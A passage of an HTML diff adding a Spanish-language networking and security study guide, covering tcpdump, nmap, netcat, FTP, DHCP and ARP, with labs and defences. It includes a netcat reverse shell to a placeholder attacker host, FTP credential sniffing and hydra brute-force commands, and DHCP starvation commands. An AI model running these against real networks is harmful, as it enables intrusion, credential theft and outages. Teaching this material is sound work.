@@ -1,0 +1,1471 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redes & Ciberseguridad</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --bg2: #161b22;
+    --bg3: #21262d;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text2: #8b949e;
+    --green: #3fb950;
+    --green-d: #0f3d1f;
+    --blue: #58a6ff;
+    --blue-d: #0d2340;
+    --red: #f85149;
+    --red-d: #3d0f0f;
+    --yellow: #d29922;
+    --yellow-d: #3d2a00;
+    --purple: #bc8cff;
+    --purple-d: #2a1a4e;
+    --orange: #e3b341;
+    --teal: #39d353;
+    --cyan: #79c0ff;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; line-height:1.6; }
+
+  /* NAV */
+  nav { position:fixed; top:0; left:0; width:260px; height:100vh; background:var(--bg2); border-right:1px solid var(--border); overflow-y:auto; z-index:100; padding:1rem 0; }
+  nav h1 { font-size:13px; font-weight:600; color:var(--text2); text-transform:uppercase; letter-spacing:.08em; padding:0 1rem 1rem; border-bottom:1px solid var(--border); margin-bottom:.5rem; }
+  nav a { display:flex; align-items:center; gap:8px; padding:6px 1rem; font-size:13px; color:var(--text2); text-decoration:none; border-radius:4px; margin:1px 4px; transition:all .15s; }
+  nav a:hover, nav a.active { background:var(--bg3); color:var(--text); }
+  nav a .dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
+
+  /* MAIN */
+  main { margin-left:260px; padding:2rem 2.5rem; max-width:960px; }
+
+  /* SECTIONS */
+  section { margin-bottom:4rem; scroll-margin-top:2rem; }
+  .section-header { display:flex; align-items:center; gap:12px; margin-bottom:1.5rem; padding-bottom:.75rem; border-bottom:1px solid var(--border); }
+  .section-icon { width:36px; height:36px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:18px; }
+  .section-header h2 { font-size:22px; font-weight:600; }
+  .section-header .badge { font-size:11px; padding:2px 8px; border-radius:20px; font-weight:500; }
+
+  /* CARDS */
+  .card { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.25rem; margin-bottom:1rem; }
+  .card h3 { font-size:15px; font-weight:600; margin-bottom:.5rem; }
+  .card p { font-size:14px; color:var(--text2); line-height:1.7; }
+
+  /* CALLOUTS */
+  .callout { border-radius:6px; padding:1rem 1.25rem; margin:.75rem 0; border-left:3px solid; }
+  .callout-title { font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:.06em; margin-bottom:.4rem; }
+  .callout p, .callout li { font-size:13.5px; line-height:1.7; }
+  .callout ul { padding-left:1.2rem; }
+  .hacker { background:rgba(248,81,73,.08); border-color:var(--red); color:#ffc6c4; }
+  .hacker .callout-title { color:var(--red); }
+  .profundizar { background:rgba(88,166,255,.08); border-color:var(--blue); color:#c0d8ff; }
+  .profundizar .callout-title { color:var(--blue); }
+  .warning { background:rgba(210,153,34,.1); border-color:var(--yellow); color:#f0d070; }
+  .warning .callout-title { color:var(--yellow); }
+  .key { background:rgba(188,140,255,.08); border-color:var(--purple); color:#dcc8ff; }
+  .key .callout-title { color:var(--purple); }
+  .tip { background:rgba(63,185,80,.08); border-color:var(--green); color:#b0f0b8; }
+  .tip .callout-title { color:var(--green); }
+
+  /* CODE */
+  .code-block { background:#0d1117; border:1px solid var(--border); border-radius:6px; overflow:hidden; margin:.75rem 0; }
+  .code-header { background:var(--bg3); padding:6px 14px; font-size:11px; color:var(--text2); display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); }
+  .copy-btn { cursor:pointer; padding:2px 8px; border-radius:4px; border:1px solid var(--border); background:transparent; color:var(--text2); font-size:11px; transition:.15s; }
+  .copy-btn:hover { background:var(--bg2); color:var(--text); }
+  pre { padding:1rem 1.25rem; font-size:13px; overflow-x:auto; font-family:'Cascadia Code','Fira Code',monospace; line-height:1.8; }
+  .k { color:#ff7b72; }
+  .s { color:#a5d6ff; }
+  .c { color:var(--text2); font-style:italic; }
+  .v { color:#79c0ff; }
+  .f { color:#d2a8ff; }
+  .n { color:#e3b341; }
+
+  /* TABS */
+  .tabs { display:flex; gap:4px; margin-bottom:1rem; flex-wrap:wrap; }
+  .tab { padding:6px 14px; border-radius:6px; border:1px solid var(--border); background:transparent; color:var(--text2); font-size:13px; cursor:pointer; transition:.15s; }
+  .tab.active, .tab:hover { background:var(--bg3); color:var(--text); }
+  .tab-content { display:none; }
+  .tab-content.active { display:block; }
+
+  /* ACCORDION */
+  .accordion { border:1px solid var(--border); border-radius:8px; overflow:hidden; margin:.75rem 0; }
+  .acc-header { padding:1rem 1.25rem; cursor:pointer; display:flex; justify-content:space-between; align-items:center; background:var(--bg2); font-size:14px; font-weight:500; transition:.15s; user-select:none; }
+  .acc-header:hover { background:var(--bg3); }
+  .acc-arrow { transition:.2s; color:var(--text2); }
+  .acc-body { display:none; padding:1.25rem; border-top:1px solid var(--border); background:var(--bg); font-size:13.5px; line-height:1.75; color:var(--text2); }
+  .acc-body.open { display:block; }
+  .acc-arrow.open { transform:rotate(90deg); }
+
+  /* PORT TABLE */
+  table { width:100%; border-collapse:collapse; font-size:13px; margin:.75rem 0; }
+  th { background:var(--bg3); padding:8px 12px; text-align:left; font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; color:var(--text2); border-bottom:1px solid var(--border); }
+  td { padding:8px 12px; border-bottom:1px solid var(--border); vertical-align:middle; }
+  tr:last-child td { border-bottom:none; }
+  tr:hover td { background:rgba(255,255,255,.02); }
+  .port { font-family:monospace; color:var(--cyan); font-size:12px; }
+  .proto { font-size:11px; padding:2px 6px; border-radius:4px; }
+  .tcp { background:rgba(63,185,80,.15); color:var(--green); }
+  .udp { background:rgba(88,166,255,.15); color:var(--blue); }
+  .both { background:rgba(188,140,255,.15); color:var(--purple); }
+
+  /* QUIZ */
+  .quiz-card { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.5rem; margin:.75rem 0; }
+  .quiz-q { font-size:15px; font-weight:600; margin-bottom:1rem; }
+  .quiz-opts { display:flex; flex-direction:column; gap:8px; }
+  .quiz-opt { padding:10px 14px; border-radius:6px; border:1px solid var(--border); cursor:pointer; font-size:13.5px; transition:.15s; }
+  .quiz-opt:hover { border-color:var(--blue); background:rgba(88,166,255,.06); }
+  .quiz-opt.correct { border-color:var(--green); background:rgba(63,185,80,.12); color:#b0f0b8; }
+  .quiz-opt.wrong { border-color:var(--red); background:rgba(248,81,73,.1); color:#ffc6c4; }
+  .quiz-feedback { margin-top:1rem; padding:.75rem 1rem; border-radius:6px; font-size:13px; display:none; }
+  .quiz-score { font-size:13px; color:var(--text2); margin-top:.5rem; }
+
+  /* DIAGRAM */
+  .flow { display:flex; align-items:center; gap:0; flex-wrap:wrap; margin:1rem 0; }
+  .flow-step { background:var(--bg3); border:1px solid var(--border); border-radius:6px; padding:8px 14px; font-size:13px; position:relative; }
+  .flow-arrow { color:var(--text2); font-size:18px; padding:0 6px; }
+  .flow-step.highlight { border-color:var(--blue); background:rgba(88,166,255,.08); color:var(--blue); }
+  .flow-step.danger { border-color:var(--red); background:rgba(248,81,73,.08); color:#ffc6c4; }
+  .flow-step.success { border-color:var(--green); background:rgba(63,185,80,.08); color:#b0f0b8; }
+
+  /* SEARCH */
+  .search-bar { width:100%; padding:10px 14px; background:var(--bg2); border:1px solid var(--border); border-radius:8px; color:var(--text); font-size:14px; margin-bottom:1.5rem; outline:none; transition:.15s; }
+  .search-bar:focus { border-color:var(--blue); }
+
+  /* PROGRESS */
+  .progress-bar { background:var(--bg3); border-radius:4px; height:6px; margin:.5rem 0; overflow:hidden; }
+  .progress-fill { height:100%; border-radius:4px; background:var(--green); transition:width .3s; }
+
+  /* TOOL CARDS */
+  .tools-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:12px; margin:.75rem 0; }
+  .tool-card { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1rem; transition:.15s; }
+  .tool-card:hover { border-color:var(--blue); }
+  .tool-name { font-size:14px; font-weight:600; font-family:monospace; color:var(--cyan); margin-bottom:.25rem; }
+  .tool-desc { font-size:12px; color:var(--text2); }
+  .tool-type { font-size:10px; margin-top:.5rem; padding:2px 6px; border-radius:4px; display:inline-block; }
+
+  /* HERO */
+  .hero { background:var(--bg2); border:1px solid var(--border); border-radius:12px; padding:2rem; margin-bottom:2rem; }
+  .hero h2 { font-size:26px; font-weight:700; margin-bottom:.5rem; }
+  .hero p { color:var(--text2); font-size:15px; }
+  .hero .stats { display:flex; gap:2rem; margin-top:1.5rem; }
+  .hero .stat-n { font-size:24px; font-weight:700; }
+  .hero .stat-l { font-size:12px; color:var(--text2); }
+
+  /* RESPONSIVE */
+  @media(max-width:768px) {
+    nav { width:100%; height:auto; position:relative; }
+    main { margin-left:0; padding:1rem; }
+  }
+
+  h4 { font-size:14px; font-weight:600; margin:.75rem 0 .4rem; color:var(--text); }
+  .tag { display:inline-block; font-size:11px; padding:2px 8px; border-radius:20px; margin:2px; }
+  .tag-red { background:rgba(248,81,73,.15); color:#ffc6c4; }
+  .tag-green { background:rgba(63,185,80,.15); color:#b0f0b8; }
+  .tag-blue { background:rgba(88,166,255,.15); color:#c0d8ff; }
+  .tag-yellow { background:rgba(210,153,34,.15); color:#f0d070; }
+  .tag-purple { background:rgba(188,140,255,.15); color:#dcc8ff; }
+
+  .inline-cmd { font-family:monospace; font-size:12.5px; background:var(--bg3); border:1px solid var(--border); padding:1px 6px; border-radius:4px; color:var(--cyan); }
+
+  .scenario { background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:1.25rem; margin:.75rem 0; border-left:3px solid var(--purple); }
+  .scenario-title { font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:.06em; color:var(--purple); margin-bottom:.5rem; }
+  .scenario p, .scenario ol, .scenario ul { font-size:13.5px; color:var(--text2); line-height:1.75; }
+  .scenario ol, .scenario ul { padding-left:1.5rem; }
+</style>
+</head>
+<body>
+
+<nav id="sidebar">
+  <h1>🛡 Redes & Seguridad</h1>
+  <a href="#intro" class="active"><span class="dot" style="background:#3fb950"></span>Introducción</a>
+  <a href="#tools"><span class="dot" style="background:#58a6ff"></span>Herramientas</a>
+  <a href="#ftp"><span class="dot" style="background:#e3b341"></span>FTP</a>
+  <a href="#dhcp"><span class="dot" style="background:#d29922"></span>DHCP</a>
+  <a href="#arp"><span class="dot" style="background:#f85149"></span>ARP & MitM</a>
+  <a href="#icmp"><span class="dot" style="background:#79c0ff"></span>ICMP</a>
+  <a href="#bgp"><span class="dot" style="background:#bc8cff"></span>BGP</a>
+  <a href="#dns"><span class="dot" style="background:#39d353"></span>DNS</a>
+  <a href="#whois"><span class="dot" style="background:#e3b341"></span>WHOIS & Reconocimiento</a>
+  <a href="#http"><span class="dot" style="background:#58a6ff"></span>HTTP / HTTPS / TLS</a>
+  <a href="#email"><span class="dot" style="background:#d29922"></span>Email (SMTP/POP3/IMAP)</a>
+  <a href="#ssh"><span class="dot" style="background:#3fb950"></span>SSH</a>
+  <a href="#vpn"><span class="dot" style="background:#bc8cff"></span>VPN</a>
+  <a href="#ports"><span class="dot" style="background:#79c0ff"></span>Puertos</a>
+  <a href="#quiz"><span class="dot" style="background:#f85149"></span>Quiz de Práctica</a>
+</nav>
+
+<main>
+  <input class="search-bar" id="search" placeholder="Buscar comandos, herramientas, conceptos..." oninput="searchContent(this.value)" />
+
+  <!-- INTRO -->
+  <section id="intro">
+    <div class="hero">
+      <h2>Herramientas de Redes & Ciberseguridad</h2>
+      <p>Guía práctica para pentesting, análisis de red y defensa. Cada sección incluye comandos reales, escenarios de ataque/defensa y ejercicios.</p>
+      <div class="stats">
+        <div><div class="stat-n" style="color:var(--green)">15</div><div class="stat-l">temas</div></div>
+        <div><div class="stat-n" style="color:var(--blue)">50+</div><div class="stat-l">comandos</div></div>
+        <div><div class="stat-n" style="color:var(--purple)">10</div><div class="stat-l">quizzes</div></div>
+        <div><div class="stat-n" style="color:var(--yellow)">CTF</div><div class="stat-l">escenarios</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- HERRAMIENTAS OVERVIEW -->
+  <section id="tools">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0d2340">🔧</div>
+      <h2>Herramientas Principales</h2>
+      <span class="badge" style="background:rgba(88,166,255,.15);color:var(--blue)">Overview</span>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('tools','capture')">Captura de tráfico</button>
+      <button class="tab" onclick="switchTab('tools','recon')">Reconocimiento</button>
+      <button class="tab" onclick="switchTab('tools','analysis')">Análisis</button>
+    </div>
+
+    <div id="tools-capture" class="tab-content active">
+      <div class="tools-grid">
+        <div class="tool-card">
+          <div class="tool-name">tcpdump</div>
+          <div class="tool-desc">Captura paquetes en CLI. El estándar en Linux para análisis rápido.</div>
+          <span class="tool-type tag-green">CLI</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">Wireshark</div>
+          <div class="tool-desc">GUI para análisis profundo de tráfico. Soporta 1000+ protocolos.</div>
+          <span class="tool-type tag-blue">GUI</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">tshark</div>
+          <div class="tool-desc">Versión CLI de Wireshark. Ideal para scripts y pipelines.</div>
+          <span class="tool-type tag-green">CLI</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">dumpcap</div>
+          <div class="tool-desc">Captura liviana sin análisis. Ideal para logs de larga duración.</div>
+          <span class="tool-type tag-green">CLI</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">netcat (nc)</div>
+          <div class="tool-desc">La navaja suiza de redes. TCP/UDP arbitrary connections.</div>
+          <span class="tool-type tag-purple">Multiuso</span>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top:1rem;">
+        <h3>tcpdump — comandos esenciales</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Capturar todo el tráfico en eth0</span>
+<span class="k">sudo</span> tcpdump <span class="v">-i</span> eth0
+
+<span class="c"># Solo tráfico HTTP (puerto 80)</span>
+<span class="k">sudo</span> tcpdump <span class="v">-i</span> eth0 <span class="s">port 80</span>
+
+<span class="c"># Capturar y guardar a archivo</span>
+<span class="k">sudo</span> tcpdump <span class="v">-i</span> eth0 <span class="v">-w</span> captura.pcap
+
+<span class="c"># Leer un archivo .pcap</span>
+<span class="k">sudo</span> tcpdump <span class="v">-r</span> captura.pcap
+
+<span class="c"># Mostrar IPs sin resolver hostnames (más rápido)</span>
+<span class="k">sudo</span> tcpdump <span class="v">-n -i</span> eth0
+
+<span class="c"># Filtrar por IP origen + puerto destino</span>
+<span class="k">sudo</span> tcpdump <span class="s">src 192.168.1.10 and dst port 443</span></pre>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Wireshark — filtros de display útiles</h3>
+        <div class="code-block">
+          <div class="code-header"><span>wireshark display filter</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Buscar sesiones por string</span>
+http contains <span class="s">"JEEDINCAGJLLJGDJCCOKIHEN"</span>
+
+<span class="c"># Buscar por dominio en DNS</span>
+dns contains <span class="s">"academia-ciberseguridad.com"</span>
+
+<span class="c"># Solo tráfico HTTP POST</span>
+http.request.method == <span class="s">"POST"</span>
+
+<span class="c"># Ver credenciales FTP</span>
+ftp.request.command == <span class="s">"USER"</span> or ftp.request.command == <span class="s">"PASS"</span>
+
+<span class="c"># Seguir conversación TCP completa</span>
+<span class="c"># (clic derecho → Follow → TCP Stream)</span>
+
+<span class="c"># Filtrar por IP</span>
+ip.addr == <span class="n">192.168.1.1</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div id="tools-recon" class="tab-content">
+      <div class="tools-grid">
+        <div class="tool-card">
+          <div class="tool-name">nmap</div>
+          <div class="tool-desc">Scanner de puertos y servicios. El más usado en pentesting.</div>
+          <span class="tool-type tag-red">Pentesting</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">nslookup</div>
+          <div class="tool-desc">Consultas DNS interactivas. Disponible en Windows y Linux.</div>
+          <span class="tool-type tag-green">CLI</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">whois</div>
+          <div class="tool-desc">Información de registro de dominios e IPs.</div>
+          <span class="tool-type tag-yellow">OSINT</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">dnsrecon</div>
+          <div class="tool-desc">Enumeración DNS avanzada. Subdominios, registros, AXFR.</div>
+          <span class="tool-type tag-red">Pentesting</span>
+        </div>
+        <div class="tool-card">
+          <div class="tool-name">amass</div>
+          <div class="tool-desc">Mapeo de superficie de ataque. OSINT + enumeración DNS.</div>
+          <span class="tool-type tag-red">Pentesting</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>nmap — escaneos más usados</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Escaneo rápido de puertos top 1000</span>
+<span class="k">nmap</span> 192.168.1.1
+
+<span class="c"># Todos los puertos (1-65535)</span>
+<span class="k">nmap</span> <span class="v">-p-</span> 192.168.1.1
+
+<span class="c"># Detección de versiones de servicios</span>
+<span class="k">nmap</span> <span class="v">-sV</span> 192.168.1.1
+
+<span class="c"># Sistema operativo + versiones + scripts</span>
+<span class="k">nmap</span> <span class="v">-A</span> 192.168.1.1
+
+<span class="c"># Escaneo sigiloso SYN (requiere root)</span>
+<span class="k">sudo nmap</span> <span class="v">-sS</span> 192.168.1.1
+
+<span class="c"># Escanear red completa /24</span>
+<span class="k">nmap</span> 192.168.1.0/24
+
+<span class="c"># Scripts de vulnerabilidades</span>
+<span class="k">nmap</span> <span class="v">--script vuln</span> 192.168.1.1
+
+<span class="c"># UDP scan (más lento pero importante)</span>
+<span class="k">sudo nmap</span> <span class="v">-sU</span> <span class="v">--top-ports</span> <span class="n">100</span> 192.168.1.1</pre>
+        </div>
+      </div>
+    </div>
+
+    <div id="tools-analysis" class="tab-content">
+      <div class="card">
+        <h3>netcat — usos prácticos</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Conectarse a un puerto (como telnet)</span>
+<span class="k">nc</span> 10.0.1.6 <span class="n">80</span>
+
+<span class="c"># Escuchar en un puerto (listener)</span>
+<span class="k">nc</span> <span class="v">-lvp</span> <span class="n">4444</span>
+
+<span class="c"># Reverse shell desde víctima</span>
+<span class="k">nc</span> ATTACKER_IP <span class="n">4444</span> <span class="v">-e</span> /bin/bash
+
+<span class="c"># Transferir un archivo</span>
+<span class="c"># Receptor:</span>
+<span class="k">nc</span> <span class="v">-lvp</span> <span class="n">9999</span> > archivo.txt
+<span class="c"># Emisor:</span>
+<span class="k">nc</span> RECEPTOR_IP <span class="n">9999</span> < archivo.txt
+
+<span class="c"># Banner grabbing (ver qué corre en un puerto)</span>
+<span class="k">nc</span> <span class="v">-v</span> 10.0.1.6 <span class="n">22</span></pre>
+        </div>
+      </div>
+
+      <div class="callout hacker">
+        <div class="callout-title">🏴‍☠️ Caso CTF: Banner Grabbing</div>
+        <p>En un CTF o pentest, lo primero que haces con netcat es <strong>banner grabbing</strong>: conectarte a puertos abiertos para ver qué servicio y versión está corriendo. Con esa versión buscas en <span class="inline-cmd">searchsploit</span> o <a href="https://exploit-db.com" style="color:var(--blue)">exploit-db.com</a> si tiene vulnerabilidades conocidas (CVEs).</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- FTP -->
+  <section id="ftp">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d2a00">📁</div>
+      <h2>FTP — File Transfer Protocol</h2>
+      <span class="badge" style="background:rgba(210,153,34,.15);color:var(--yellow)">Puerto 21</span>
+    </div>
+
+    <div class="card">
+      <h3>Comandos FTP en sesión interactiva</h3>
+      <div class="code-block">
+        <div class="code-header"><span>bash — sesión FTP</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># Conectar al servidor</span>
+<span class="k">ftp</span> 10.0.1.6
+
+<span class="c"># Dentro de la sesión FTP:</span>
+ftp> <span class="f">ls</span>           <span class="c"># listar archivos</span>
+ftp> <span class="f">get</span> file.bin  <span class="c"># descargar archivo</span>
+ftp> <span class="f">put</span> local.txt  <span class="c"># subir archivo</span>
+ftp> <span class="f">cd</span> /directorio <span class="c"># cambiar directorio</span>
+ftp> <span class="f">mget</span> *.txt     <span class="c"># descargar múltiples</span>
+ftp> <span class="f">pwd</span>           <span class="c"># directorio actual</span>
+ftp> <span class="f">passive</span>       <span class="c"># modo pasivo (bypass NAT/firewall)</span>
+ftp> <span class="f">binary</span>        <span class="c"># modo binario (para archivos no-texto)</span>
+ftp> <span class="f">quit</span>          <span class="c"># cerrar sesión</span>
+
+<span class="c"># Login anónimo (pentesting)</span>
+<span class="k">ftp</span> 10.0.1.6
+<span class="c"># user: anonymous | pass: (enter vacío o email falso)</span></pre>
+      </div>
+    </div>
+
+    <div class="callout warning">
+      <div class="callout-title">⚠️ Vulnerabilidad crítica</div>
+      <p>FTP transmite <strong>TODO en texto plano</strong>: usuario, contraseña, y datos. Cualquier atacante en la misma red puede capturarlo con tcpdump/Wireshark. En producción usa <strong>SFTP</strong> (SSH, puerto 22) o <strong>FTPS</strong> (FTP + TLS, puerto 990).</p>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ Técnica: Capturar credenciales FTP</div>
+      <p>Si estás en la misma red que el servidor FTP y logras hacer ARP Spoofing (ver sección ARP), puedes interceptar la sesión:</p>
+      <div class="code-block" style="margin-top:.5rem;">
+        <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># Capturar credenciales FTP en la red</span>
+<span class="k">sudo</span> tcpdump <span class="v">-i</span> eth0 <span class="s">port 21 -A</span> | grep <span class="v">-E</span> <span class="s">"USER|PASS"</span>
+
+<span class="c"># En Wireshark, filtro específico para credenciales:</span>
+ftp.request.command == <span class="s">"USER"</span> or ftp.request.command == <span class="s">"PASS"</span></pre>
+      </div>
+    </div>
+
+    <div class="scenario">
+      <div class="scenario-title">📋 Escenario de Práctica</div>
+      <p><strong>Lab:</strong> Usa una VM con vsftpd o proftpd habilitado con anonymous login. Conéctate desde otra VM y usa Wireshark para capturar tus propias credenciales en texto plano. Observa cómo el paquete muestra <span class="inline-cmd">USER admin</span> y <span class="inline-cmd">PASS contraseña123</span> en texto claro.</p>
+      <br>
+      <p><strong>Defensa:</strong> Configura el servidor para aceptar solo FTPS o migra a SFTP. Compara los paquetes capturados — con TLS/SSH no se ve nada legible.</p>
+    </div>
+
+    <div class="callout profundizar">
+      <div class="callout-title">🔬 Para Profundizar</div>
+      <ul>
+        <li>Diferencia entre modo activo vs. pasivo en FTP (importante con firewalls)</li>
+        <li>Herramienta <span class="inline-cmd">hydra</span> para fuerza bruta en FTP: <span class="inline-cmd">hydra -l admin -P wordlist.txt ftp://10.0.1.6</span></li>
+        <li>Configurar VSFTPD en Linux con TLS habilitado</li>
+        <li>Anonymous FTP en CTFs: siempre probar <span class="inline-cmd">anonymous:anonymous</span></li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- DHCP -->
+  <section id="dhcp">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d2a00">📡</div>
+      <h2>DHCP — Asignación Dinámica de IPs</h2>
+      <span class="badge" style="background:rgba(210,153,34,.15);color:var(--yellow)">UDP 67/68</span>
+    </div>
+
+    <div class="card">
+      <h3>Flujo DORA — cómo obtienes tu IP</h3>
+      <div class="flow">
+        <div class="flow-step highlight">Discover</div><div class="flow-arrow">→</div>
+        <div class="flow-step">Offer</div><div class="flow-arrow">→</div>
+        <div class="flow-step">Request</div><div class="flow-arrow">→</div>
+        <div class="flow-step success">ACK</div>
+      </div>
+      <p style="font-size:13px;color:var(--text2);margin-top:.5rem;">
+        <strong style="color:var(--blue)">D</strong>iscover: el cliente broadcast "¿hay algún servidor DHCP?" →
+        <strong style="color:var(--text)">O</strong>ffer: el servidor responde con una IP disponible →
+        <strong style="color:var(--text)">R</strong>equest: el cliente acepta la oferta →
+        <strong style="color:var(--green)">A</strong>CK: el servidor confirma la asignación.
+      </p>
+    </div>
+
+    <div class="accordion">
+      <div class="acc-header" onclick="toggleAcc(this)">
+        <span>🔴 Ataque: DHCP Starvation</span><span class="acc-arrow">▶</span>
+      </div>
+      <div class="acc-body">
+        <p><strong>¿Qué es?</strong> El atacante envía miles de solicitudes DHCP con MACs falsas, agotando el pool de IPs disponibles. Los clientes legítimos ya no pueden obtener IP → denegación de servicio.</p>
+        <br>
+        <div class="code-block">
+          <div class="code-header"><span>bash — herramienta yersinia</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># DHCP Starvation con yersinia</span>
+<span class="k">sudo</span> yersinia dhcp <span class="v">-attack</span> 1 <span class="v">-interface</span> eth0
+
+<span class="c"># O con dhcpstarv:</span>
+<span class="k">sudo</span> dhcpstarv <span class="v">-i</span> eth0</pre>
+        </div>
+        <br>
+        <p><strong>Defensa — DHCP Snooping en switches:</strong> El switch crea una tabla de confianza. Solo los puertos "trusted" (uplinks) pueden enviar DHCP Offers. Los puertos de usuarios solo pueden hacer Discover/Request, nunca Offer/ACK.</p>
+        <div class="code-block">
+          <div class="code-header"><span>cisco ios</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c">! Habilitar DHCP Snooping globalmente</span>
+Switch(config)# <span class="k">ip dhcp snooping</span>
+Switch(config)# <span class="k">ip dhcp snooping vlan</span> <span class="n">10</span>
+
+<span class="c">! Marcar el puerto del servidor DHCP como "trusted"</span>
+Switch(config-if)# <span class="k">ip dhcp snooping trust</span>
+
+<span class="c">! Limitar solicitudes por segundo en puerto usuario</span>
+Switch(config-if)# <span class="k">ip dhcp snooping limit rate</span> <span class="n">10</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <div class="acc-header" onclick="toggleAcc(this)">
+        <span>🔴 Ataque: Rogue DHCP Server</span><span class="acc-arrow">▶</span>
+      </div>
+      <div class="acc-body">
+        <p>Un atacante levanta su propio servidor DHCP. Si responde primero al Discover del cliente, le asigna una IP con el <strong>gateway del atacante</strong> como default gateway. Todo el tráfico del cliente pasa por el atacante → MitM sin ARP Spoofing.</p>
+        <br>
+        <div class="code-block">
+          <div class="code-header"><span>python — rogue DHCP con scapy</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Ejemplo conceptual con scapy</span>
+<span class="k">from</span> scapy.all <span class="k">import</span> *
+
+<span class="k">def</span> <span class="f">rogue_dhcp</span>(pkt):
+    <span class="k">if</span> DHCP <span class="k">in</span> pkt <span class="k">and</span> pkt[DHCP].options[<span class="n">0</span>][<span class="n">1</span>] == <span class="n">1</span>: <span class="c"># Discover</span>
+        <span class="c"># Construir DHCP Offer malicioso</span>
+        <span class="c"># gateway = IP del atacante</span>
+        pass
+
+sniff(filter=<span class="s">"udp and port 67"</span>, prn=rogue_dhcp)</pre>
+        </div>
+        <br>
+        <p><strong>Defensa:</strong> DHCP Snooping previene esto al bloquear Offers desde puertos no confiables.</p>
+      </div>
+    </div>
+
+    <div class="callout profundizar">
+      <div class="callout-title">🔬 Para Profundizar</div>
+      <ul>
+        <li>Configurar servidor DHCP en Linux: <span class="inline-cmd">sudo apt install isc-dhcp-server</span>, archivo <span class="inline-cmd">/etc/dhcp/dhcpd.conf</span></li>
+        <li>Room TryHackMe: "Networking Fundamentals" → módulo DHCP</li>
+        <li>Investigar: DHCP Option 82 (información de relay) para trazabilidad</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ARP -->
+  <section id="arp">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d0f0f">⚠️</div>
+      <h2>ARP Spoofing / Poisoning</h2>
+      <span class="badge" style="background:rgba(248,81,73,.15);color:var(--red)">Capa 2</span>
+    </div>
+
+    <div class="card">
+      <h3>¿Cómo funciona ARP?</h3>
+      <p style="font-size:13.5px;color:var(--text2);margin-bottom:1rem;">ARP (Address Resolution Protocol) mapea IPs a MACs dentro de la red local. Cuando quieres enviar datos a 192.168.1.1, tu PC broadcast: "¿Quién tiene 192.168.1.1? Dime tu MAC." El dueño de esa IP responde con su MAC.</p>
+      <div class="code-block">
+        <div class="code-header"><span>bash — ver tabla ARP</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># Ver tu tabla ARP local (IPs ↔ MACs conocidas)</span>
+<span class="k">arp</span> <span class="v">-a</span>      <span class="c"># Linux/Mac/Windows</span>
+
+<span class="c"># Ejemplo de salida:</span>
+<span class="c"># ? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0</span>
+<span class="c"># ? (192.168.1.20) at 11:22:33:44:55:66 [ether] on eth0</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>ARP Spoofing — el ataque MitM clásico</h3>
+      <p style="font-size:13.5px;color:var(--text2);margin-bottom:.75rem;">El atacante envía ARP Replies falsos. Le dice a la víctima "yo soy el gateway" y le dice al gateway "yo soy la víctima". Ambos actualizan sus tablas ARP → todo el tráfico pasa por el atacante.</p>
+      <div class="flow" style="flex-direction:column;align-items:flex-start;gap:8px;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <div class="flow-step" style="min-width:120px;">Víctima</div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-step danger">Atacante</div>
